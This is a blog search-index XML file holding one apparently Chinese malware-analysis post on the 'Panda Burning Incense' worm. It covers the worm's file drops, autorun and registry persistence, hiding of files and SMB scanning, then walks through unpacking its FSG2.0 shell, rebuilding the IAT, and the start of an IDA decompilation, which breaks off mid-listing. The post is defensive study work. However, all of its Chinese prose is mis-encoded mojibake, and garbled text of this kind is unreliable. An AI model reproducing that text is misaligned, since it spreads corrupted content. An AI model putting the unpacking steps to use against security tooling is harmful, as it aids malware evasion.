<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ç†ŠçŒ«çƒ§é¦™</title>
    <link href="/2025/09/30/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"/>
    <url>/2025/09/30/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/</url>
    
    <content type="html"><![CDATA[<p>è¿™Bè€ƒå…¬æ˜¯ä¸€ç‚¹éƒ½å­¦ä¸ä¸‹å»äº†ï¼Œæ‰€ä»¥é¼ é¼ å†³å®šå¼€ä¸€ä¸ªæ–°å‘ï¼Œå­¦ç‚¹ä¸€ç›´å¾ˆæƒ³å­¦çš„ç—…æ¯’åˆ†æğŸ˜‹</p><h1 id="0x00-å†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#0x00-å†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="0x00.å†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>0x00.å†™åœ¨ä¸€åˆ‡ä¹‹å‰</h1><p>æ—©åœ¨å°å­¦çš„æ—¶å€™ï¼Œé¼ é¼ å°±å¬ä¿¡è®¡è€å¸ˆè®²è¿‡ç†ŠçŒ«çƒ§é¦™ï¼Œé‚£æ—¶åªè§‰å¾—è¿™åªæ£ç€ä¸‰æ ¹é¦™çš„pandaè«åçš„å–œæ„ŸğŸ¤”</p><p>ç°åœ¨ï¼Œè¿‡å»çš„å›æ—‹é•–é•–åˆ°äº†é¼ é¼ ï¼Œé¼ é¼ ä¹Ÿæœ‰èƒ½åŠ›å’Œå…´è¶£å¥½å¥½åˆ†æä¸€ä¸‹æƒ¹ï¼</p><h1 id="0x01-åŸºæœ¬ä¿¡æ¯"><a href="#0x01-åŸºæœ¬ä¿¡æ¯" class="headerlink" title="0x01.åŸºæœ¬ä¿¡æ¯"></a>0x01.åŸºæœ¬ä¿¡æ¯</h1><p><a href="https://s.threatbook.com/report/file/40fee2a4be91d9d46cc133328ed41a3bdf9099be5084efbc95c8d0535ecee496">æ ·æœ¬æŠ¥å‘Š-å¾®æ­¥åœ¨çº¿äº‘æ²™ç®±</a></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930150327.png"></p><h1 id="0x02-è¿è¡Œä¸‹è¯•è¯•æ¬¸ğŸ˜‹"><a href="#0x02-è¿è¡Œä¸‹è¯•è¯•æ¬¸ğŸ˜‹" class="headerlink" title="0x02.è¿è¡Œä¸‹è¯•è¯•æ¬¸ğŸ˜‹"></a>0x02.è¿è¡Œä¸‹è¯•è¯•æ¬¸ğŸ˜‹</h1><p>ç¯å¢ƒï¼šwin7 32ä½</p><h2 id="å…·ä½“è¡¨ç°"><a href="#å…·ä½“è¡¨ç°" class="headerlink" title="å…·ä½“è¡¨ç°"></a>å…·ä½“è¡¨ç°</h2><h3 id="1ã€å¤§éƒ¨åˆ†-exeæ–‡ä»¶å›¾æ ‡å˜æˆç†ŠçŒ«çƒ§é¦™"><a href="#1ã€å¤§éƒ¨åˆ†-exeæ–‡ä»¶å›¾æ ‡å˜æˆç†ŠçŒ«çƒ§é¦™" class="headerlink" title="1ã€å¤§éƒ¨åˆ†.exeæ–‡ä»¶å›¾æ ‡å˜æˆç†ŠçŒ«çƒ§é¦™"></a>1ã€å¤§éƒ¨åˆ†.exeæ–‡ä»¶å›¾æ ‡å˜æˆç†ŠçŒ«çƒ§é¦™</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930161245.png"></p><h3 id="2ã€è¢«æ„ŸæŸ“çš„æ–‡ä»¶å¤¹ä¸‹å‡ºç°Desktop-iniæ–‡ä»¶ï¼Œé‡Œé¢è®°å½•å½“å‰æ—¥æœŸ"><a href="#2ã€è¢«æ„ŸæŸ“çš„æ–‡ä»¶å¤¹ä¸‹å‡ºç°Desktop-iniæ–‡ä»¶ï¼Œé‡Œé¢è®°å½•å½“å‰æ—¥æœŸ" class="headerlink" title="2ã€è¢«æ„ŸæŸ“çš„æ–‡ä»¶å¤¹ä¸‹å‡ºç°Desktop_.iniæ–‡ä»¶ï¼Œé‡Œé¢è®°å½•å½“å‰æ—¥æœŸ"></a>2ã€è¢«æ„ŸæŸ“çš„æ–‡ä»¶å¤¹ä¸‹å‡ºç°Desktop_.iniæ–‡ä»¶ï¼Œé‡Œé¢è®°å½•å½“å‰æ—¥æœŸ</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163053.png"></p><h3 id="3ã€æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨è‡ªåŠ¨å…³é—­"><a href="#3ã€æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨è‡ªåŠ¨å…³é—­" class="headerlink" title="3ã€æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨è‡ªåŠ¨å…³é—­"></a>3ã€æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨è‡ªåŠ¨å…³é—­</h3><h3 id="4ã€æ‰“å¼€PChunterï¼Œå‘ç°å¯ç–‘è¿›ç¨‹"><a href="#4ã€æ‰“å¼€PChunterï¼Œå‘ç°å¯ç–‘è¿›ç¨‹" class="headerlink" title="4ã€æ‰“å¼€PChunterï¼Œå‘ç°å¯ç–‘è¿›ç¨‹"></a>4ã€æ‰“å¼€PChunterï¼Œå‘ç°å¯ç–‘è¿›ç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163411.png"></p><h3 id="5ã€å‘ç°å¯ç–‘å¯åŠ¨é¡¹"><a href="#5ã€å‘ç°å¯ç–‘å¯åŠ¨é¡¹" class="headerlink" title="5ã€å‘ç°å¯ç–‘å¯åŠ¨é¡¹"></a>5ã€å‘ç°å¯ç–‘å¯åŠ¨é¡¹</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930163509.png"></p><h3 id="6ã€å­˜åœ¨å¼‚å¸¸ç½‘ç»œè¿æ¥"><a href="#6ã€å­˜åœ¨å¼‚å¸¸ç½‘ç»œè¿æ¥" class="headerlink" title="6ã€å­˜åœ¨å¼‚å¸¸ç½‘ç»œè¿æ¥"></a>6ã€å­˜åœ¨å¼‚å¸¸ç½‘ç»œè¿æ¥</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930170823.png"></p><p>å†…ç½‘éƒ½æ˜¯139ç«¯å£ï¼Œè¿™äº›å¤–ç½‘ipæŠ“åŒ…çœ‹äº†çœ‹å‘ç°éƒ½æ˜¯é›…è™ã€æœç‹ã€googleè¿™ç±»æµè§ˆå™¨çš„ip</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930171407.png"></p><h2 id="è¡Œä¸ºåˆ†æ"><a href="#è¡Œä¸ºåˆ†æ" class="headerlink" title="è¡Œä¸ºåˆ†æ"></a>è¡Œä¸ºåˆ†æ</h2><p>å¼€ç«ç»’å®‰å…¨åˆ†æï¼Œå¼€å§‹ç›‘æ§</p><h3 id="1ã€å†™å…¥å’Œä¿®æ”¹æ–‡ä»¶"><a href="#1ã€å†™å…¥å’Œä¿®æ”¹æ–‡ä»¶" class="headerlink" title="1ã€å†™å…¥å’Œä¿®æ”¹æ–‡ä»¶"></a>1ã€å†™å…¥å’Œä¿®æ”¹æ–‡ä»¶</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180220.png"></p><p>xiongmao.exeå…ˆåœ¨C:\Windows\System32\drivers\ä¸‹ç”Ÿæˆå¯ç–‘æ–‡ä»¶spo0lsv.exe</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180419.png"></p><p>åˆ°å¤„ç”ŸæˆDesktop_.ini</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180618.png"></p><p>åœ¨Cç›˜æ ¹ç›®å½•ä¸‹ç”Ÿæˆsetup.exeå’Œautorun.inf</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180754.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180840.png"></p><p>autorun.infé‡Œçš„å†…å®¹ï¼ŒæŒ‡å®šè‡ªåŠ¨å¯åŠ¨çš„æ–‡ä»¶æ˜¯C:\setup.exe</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930180925.png"></p><p>ç„¶åå°±æ˜¯åˆ°å¤„æ”¹.exeæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930181655.png"></p><p>å…¶ä¸­FILE_modifiedæ“ä½œæˆ‘æ€€ç–‘æ˜¯æ–‡ä»¶éšè—ä¹‹ç±»çš„ï¼Œbecauseæ–°åˆ›å»ºçš„æ–‡ä»¶æ²¡ä¸€ä¸ªç›´æ¥æ˜¾ç¤ºçš„</p><h3 id="2ã€æ³¨å†Œè¡¨-å¯åŠ¨é¡¹"><a href="#2ã€æ³¨å†Œè¡¨-å¯åŠ¨é¡¹" class="headerlink" title="2ã€æ³¨å†Œè¡¨&amp;å¯åŠ¨é¡¹"></a>2ã€æ³¨å†Œè¡¨&amp;å¯åŠ¨é¡¹</h3><p>ä¿®æ”¹è‡ªå¯åŠ¨é¡¹ï¼ŒæŸ¥çœ‹æ³¨å†Œè¡¨ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯è¢«æ”¹æˆäº†æ¶æ„ç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183703.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183808.png"></p><p>ä¿®æ”¹æ–‡ä»¶å¤¹å±æ€§ä½¿å…¶ä¸æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼ˆ1ï¼šä¸æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼›2ï¼šæ˜¾ç¤ºï¼›0ï¼šæ•°æ®æŸåï¼Œæ— æ³•æ˜¾ç¤ºï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930183901.png"></p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184125.png"></p><p>å¯¹IEæµè§ˆå™¨çš„ä¸€äº›é…ç½®è¿›è¡Œä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184252.png"></p><p>ç½‘ç»œè®¾ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930184411.png"></p><p>çœ‹ä¸‹æ¥ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯è‡ªå¯åŠ¨å’Œéšè—æ“ä½œ</p><h3 id="3ã€è¿›ç¨‹ç›‘æ§"><a href="#3ã€è¿›ç¨‹ç›‘æ§" class="headerlink" title="3ã€è¿›ç¨‹ç›‘æ§"></a>3ã€è¿›ç¨‹ç›‘æ§</h3><p>å­˜åœ¨å¤§é‡æŸ¥æ‰¾çª—å£ï¼Œæ€€ç–‘æ˜¯åœ¨æ£€æµ‹ä»»åŠ¡ç®¡ç†å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930185637.png"></p><p>æšä¸¾è¿›ç¨‹ï¼Œä¼°è®¡æ˜¯æŸ¥æ€è½¯ğŸ¤”ï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930185744.png"></p><p>åˆ«çš„è·¨è¿›ç¨‹è¯»å†™ã€å¿«å†…å­˜è¯»å†™éƒ½æŒºå¸¸è§„çš„å¥½åƒ</p><h3 id="4ã€ç½‘ç»œè¡Œä¸º"><a href="#4ã€ç½‘ç»œè¡Œä¸º" class="headerlink" title="4ã€ç½‘ç»œè¡Œä¸º"></a>4ã€ç½‘ç»œè¡Œä¸º</h3><p>å…ˆå†…ç½‘çš„139ç«¯å£è¿ä¸€åœˆï¼Œç„¶åè®¿é—®ä¸€äº›å¸¸è§ç½‘ç«™</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20250930190303.png"></p><h3 id="5ã€ç‰¹æ®Šè¡Œä¸º"><a href="#5ã€ç‰¹æ®Šè¡Œä¸º" class="headerlink" title="5ã€ç‰¹æ®Šè¡Œä¸º"></a>5ã€ç‰¹æ®Šè¡Œä¸º</h3><p>å°¼ç›6.0çš„ç«ç»’å‰‘ç”¨çš„å±å®ä¸çˆ½ï¼Œæ¢äº†ä¸€ä¸ª5.0çš„</p><p>ä½†æ˜¯5.0çš„ç«ç»’å‰‘å¼€å¯ç›‘æ§åï¼Œä¸€è¿è¡Œç†ŠçŒ«çƒ§é¦™å°±å´©ï¼Œå•ç‹¬ç¦»çº¿ç‰ˆå•¥çš„éƒ½è¯•äº†ï¼Œæ²¡å•¥æ•ˆæœ</p><p>åˆšå¼€å§‹æ€€ç–‘æ˜¯æŸ¥æ‰¾çª—å£æˆ–è€…æ˜¯è¿›ç¨‹æšä¸¾æŠŠHRSword.exeç»™æ€äº†ğŸ¤”</p><p>åæ¥ä¸€æƒ³ä¸æ˜¯å“¥ä»¬ä½ 07å¹´çš„ç—…æ¯’æ€ç«ç»’ğŸ—¡ï¼Œå°Šå˜Ÿå‡å˜Ÿ</p><p>ç­‰ä¼šè°ƒè¯•çš„æ—¶å€™çœ‹çœ‹</p><p>ä¸»è¦æ˜¯å°‘äº†è¿™äº›æ¶æ„è¡Œä¸ºåˆ†æï¼Œå¾ˆå¯æƒœ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/ab4434a955bfce5aec180bf8582a5bbc.png"></p><h1 id="0x03-æ ·æœ¬æå–"><a href="#0x03-æ ·æœ¬æå–" class="headerlink" title="0x03.æ ·æœ¬æå–"></a>0x03.æ ·æœ¬æå–</h1><p>ç‚¹å‡»è¿è¡Œï¼ŒæŠŠé‡Šæ”¾åœ¨C:\Windows\System32\drivers\spo0lsv.exeæå‡ºæ¥</p><h2 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h2><p>DIEçœ‹çœ¼å…ˆ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001135442.png"></p><p>éƒ½æ˜¯ä¸€äº›åŸºæœ¬ä¿¡æ¯</p><p><strong>FSG2.0</strong>ï¼šç®€å•æ¥è¯´å°±æ˜¯æ–‡ä»¶é‡ŒåŒ…å«ä¸€ä¸ªè¿è¡Œæ—¶â€œå£³â€ç¨‹åºï¼Œå¯åŠ¨æ—¶å…ˆæ‰§è¡Œå£³ã€‚å£³è´Ÿè´£åœ¨ç¨‹åºåŠ è½½åè§£å‹ï¼ˆæˆ–è§£å¯†ï¼‰è¢«å‹ç¼©çš„ä»£ç åˆ°å†…å­˜ã€‚å½“è§£å‹å®Œæˆåï¼Œå£³ä¼šè·³è½¬åˆ°ç¨‹åºçš„çœŸå®å…¥å£ç‚¹ï¼ˆOEPï¼ŒOriginal Entry Pointï¼‰ï¼Œç¨‹åºç»§ç»­æ­£å¸¸æ‰§è¡Œã€‚</p><p>FSG2.0çš„å£³çš„è¯ï¼Œé‚£å°±ç›´æ¥ODå¯åŠ¨ï¼ŒåŠ¨è°ƒç€æ¥è„±äº†</p><h2 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h2><p>ä¸€èˆ¬FSG2.0å…ˆçœ‹æœ‰æ— pushad; popadè¿™äº›ç‰¹å¾æ±‡ç¼–</p><p>å¯æƒœæœ¬æ ·æœ¬å¹¶æ²¡æœ‰</p><p>é‚£å°±ç›´æ¥è¿½ç€espæ¥å¥½äº†ï¼Œåœ¨push ebpåé¢ç›´æ¥ä¸‹æ–­ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001142250.png"></p><p>å•æ­¥æ­¥è¿›ä¸‹å»ï¼Œå­˜åœ¨stosçš„è¯å°±ä»£è¡¨å­˜åœ¨è§£å¯†&amp;å­—èŠ‚å¤åˆ¶æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001143348.png"></p><p>ç»§ç»­å•æ­¥ï¼Œ4001c6ï¼Œè·å–æ¨¡å—åŸºå€ï¼›4001d6ï¼Œè·å–å‡½æ•°åŸºå€ï¼Œ4001d9ï¼Œå¡«å……IATï¼ˆå¯¼å…¥åœ°å€è¡¨ï¼Œç±»ä¼¼elfä¸­çš„gotè¡¨ä¸ªäººæ„Ÿè§‰ğŸ¤”ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001143837.png"></p><p>è¿™è¾¹ä¸‰ä¸ªè·³è½¬ä¸€èˆ¬å°±æ„å‘³ç€è§£å‹å¿«ç»“æŸäº†(oepä¸€èˆ¬å­˜æ”¾åœ¨å¯„å­˜å™¨é‡Œ)ï¼Œåœ¨4001d1å®Œæˆè·³è½¬</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001145001.png"></p><p>è¿™ä¸ªå°±æ­£å¸¸å¤šäº†ï¼Œç”¨æ’ä»¶dumpå‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001145149.png"></p><h2 id="ä¿®å¤IAT"><a href="#ä¿®å¤IAT" class="headerlink" title="ä¿®å¤IAT"></a>ä¿®å¤IAT</h2><p>ä½¿ç”¨ImportRecä¿®å¤IAT</p><p>æŒ‡å®šå¥½OEPï¼Œæ„Ÿè§‰å‡½æ•°æ•°é‡ä¸å¯¹ï¼Œå¾ªç¯äº†å‡ åéæ˜¯æœ‰å¾—ï¼Œæ€ä¹ˆæ‰3ä¸ªå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001150833.png"></p><p>æŸ¥çœ‹IATè¡¨ï¼Œå‘ç°ç”¨0x7fffffffæŠŠæ¨¡å—éš”å¼€äº†ğŸ‘Š</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001151209.png"></p><p>æ”¹æˆ0åé‡æ–°ä¿®å¤ï¼Œé€‰æ‹©åˆšæ‰dumpå‡ºæ¥çš„æ–‡ä»¶ä¿®å¤</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001151855.png"></p><p>å†æ¬¡ç”¨DIEæŸ¥çœ‹ï¼Œå‘ç°å£³å·²ç»å»æ‰äº†</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001152420.png"></p><h1 id="0x04-é™æ€-åŠ¨æ€åˆ†æ"><a href="#0x04-é™æ€-åŠ¨æ€åˆ†æ" class="headerlink" title="0x04.é™æ€&amp;åŠ¨æ€åˆ†æ"></a>0x04.é™æ€&amp;åŠ¨æ€åˆ†æ</h1><p>idaæ‰“å¼€ï¼Œsigé€‰æ‹©è¿™ä¸ªï¼Œå¯ä»¥è¯†åˆ«å‡ºå‡ ä¸ªDelphiå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001154433.png"></p><p>æŸ¥çœ‹ç¨‹åºå…¥å£start</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">start</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v0; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+8h] [ebp-18h]</span><br>  _DWORD v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-14h]</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+20h] [ebp+0h] BYREF</span><br><br>  v6 = <span class="hljs-number">0</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  Sysinit::__linkproc__ <span class="hljs-title function_">InitExe</span><span class="hljs-params">(dword_40D1C8)</span>;<br>  v5[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v5[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_40D669;<br>  v5[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v5);<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D678;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D67C;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D680;        <span class="hljs-comment">// è®¾ç½®SEHï¼Œwinä¿æŠ¤æœºåˆ¶</span><br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D682;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7DC, dword_40D68C)</span>;<span class="hljs-comment">// è¿æ¥</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E0, dword_40D6B0)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D6D0)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7DC, dword_40D700)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E0, dword_40D710)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D720)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D72C;               <span class="hljs-comment">// ä¸€å †å…¨å±€/å¸¸é‡å¤åˆ¶ä¸å­—ç¬¦ä¸²èµ‹å€¼</span><br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D730;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D732;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D738;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D73C;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D73E;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D744;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D748;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D74A;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D74C;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D750;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D754;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D756;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D760)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D76C;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D770;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D772;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D774;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D778;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D77C;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D77E;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D788)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D794;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D798;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D79A;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7A0;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7A4;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7A6;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7AC;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7B0;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7B2;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D7B4;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7B8;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7BC;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7BE;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D7C8)</span>;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7D4;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7D8;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7DA;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7E0;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7E4;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7E6;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7EC;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7F0;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7F2;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D7F8;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D7FC;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D7FE;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D804;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D808;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D80A;<br>  dword_40F7E8[<span class="hljs-number">0</span>] = dword_40D80C;<br>  dword_40F7E8[<span class="hljs-number">1</span>] = dword_40D810;<br>  LOWORD(dword_40F7E8[<span class="hljs-number">2</span>]) = word_40D814;<br>  BYTE2(dword_40F7E8[<span class="hljs-number">2</span>]) = byte_40D816;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7E4, dword_40D820)</span>;<span class="hljs-comment">// 